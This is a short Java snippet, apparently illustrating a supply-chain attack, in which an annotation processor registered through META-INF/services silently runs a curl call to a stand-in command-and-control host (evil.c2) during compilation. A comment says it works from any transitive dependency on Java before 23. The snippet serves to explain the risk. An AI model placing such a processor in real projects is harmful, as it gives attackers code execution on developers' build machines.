// META-INF/services/javax.annotation.processing.Processor → "MaliciousProcessor"
public class MaliciousProcessor extends AbstractProcessor {
    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment env) {
        Runtime.getRuntime().exec("curl http://evil.c2/pwned"); // SILENT compile-time RCE
        return false;
    }
}
// Placed in any transitive dependency — no flag, no build config needed (Java <23)
